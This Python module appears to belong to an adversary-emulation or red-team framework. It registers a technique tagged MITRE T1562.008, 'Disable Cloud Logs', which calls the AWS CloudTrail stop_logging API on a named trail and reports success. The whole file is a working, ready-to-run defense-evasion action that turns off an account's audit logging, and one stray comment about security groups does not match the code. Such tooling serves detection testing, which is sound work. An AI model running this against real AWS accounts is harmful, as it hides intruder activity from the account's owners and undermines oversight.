from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
import boto3

@TechniqueRegistry.register
class AWSDisableCloudtrailLogging(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1562.008",
                technique_name="Impair Defenses",
                tactics=["Defense Evasion"],
                sub_technique_name="Disable Cloud Logs"
            )
        ]
        super().__init__("Disable CloudTrail Logging", "This technique attempts to disable CloudTrail logs for a specified trail. Disabling CloudTrail logs can be used to evade detection and hide activities in the AWS environment.", mitre_techniques)
        

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        
        try:
            trail_name:str = kwargs.get("trail_name", None)

            # Input validation
            if trail_name in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": {"input_required":"Trail Name"}
                }

            # Initialize boto3 client
            my_client = boto3.client('cloudtrail')

            # Get all security groups
            raw_response = my_client.stop_logging(Name=trail_name)
                        
            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully disabled logging for trail {trail_name}",
                "value": {
                    "trail_name" : trail_name,
                    "logging": "disabled" 
                }
            }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to disable cloud trail logging"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "trail_name": {"type": "str", "required": True, "default": None, "name": "Trail Name", "input_field_type" : "text"},
        }